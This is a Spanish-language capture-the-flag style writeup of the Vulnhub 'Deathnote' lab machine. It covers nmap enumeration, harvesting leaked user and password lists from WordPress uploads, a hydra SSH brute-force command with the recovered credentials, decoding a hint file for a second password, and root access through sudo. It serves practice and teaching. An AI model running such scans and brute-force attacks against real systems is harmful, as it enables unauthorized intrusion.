---
title: Vulnhub - Deathnote
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Wordpress', 'Information Leakage']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Deathnote/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Deathnote Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Wordpress, Information Leakage**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Deathnote/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Deathnote/02-versions.png)

> Al visitar la página web, nos redirige a **deathnote.vuln**, por lo que añadimos la ip y el dominio al archivo /etc/hosts
{: .prompt-info }

d. El sitio web aloja un **Wordpress**, al ver el código fuente de la página nos damos cuenta que las imágenes se cargan desde http://deathnote.vuln/wordpress/wp-content/uploads/, y si vamos investigando entre los directorios llegaremos a los archivos **users.txt** y **notes.txt**

* **`http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/`**

    ![](/assets/images/Vulnhub/Easy/Deathnote/03-info.png)

* Copiamos la información de los archivos y hacemos fuerza bruta al servicio SSH

    ```bash
    hydra -L users.txt -P passwords.txt -f -u ssh://<IP> -t 4 -I

    [22][ssh] host: 192.168.100.15   login: l   password: death4me
    ```

    - **`-u`** Cada usuario se intentará con todas las contraseñas.
    - **`-f`** El programa se detiene en la primera coincidencia.

e. Con las credenciales encontradas con Hydra nos autenticamos en el servicio SSH

### Escalada de Privilegios 💹

a. Después de intentar por muchas formas de obtener la credencial del otro usuario **kira**, llegamos **`/opt/L/fake-notebook-rule`**

```bash
-rw-r--r-- 1 root root   84 Aug 29  2021 case.wav
-rw-r--r-- 1 root root   15 Aug 29  2021 hint
```

b. Usamos **Cyber Chef** para ver la credencial en hint en texto claro

![](/assets/images/Vulnhub/Easy/Deathnote/04-passwd.png)

* Ahora nos transformamos en kira y vemos los privilegios de tipo sudoers

    ```bash
    kira@deathnote:/opt/L/fake-notebook-rule$ sudo -l
    <SNIP>
    User kira may run the following commands on deathnote:
        (ALL : ALL) ALL
    ```

    * Todos los usuarios pueden ejecutar comandos como cualquier otro usuario. 😯

c. Nos transformamos en root y leemos la flag

```bash
kira@deathnote:/$ sudo su
root@deathnote:/# ls /root/
root.txt
```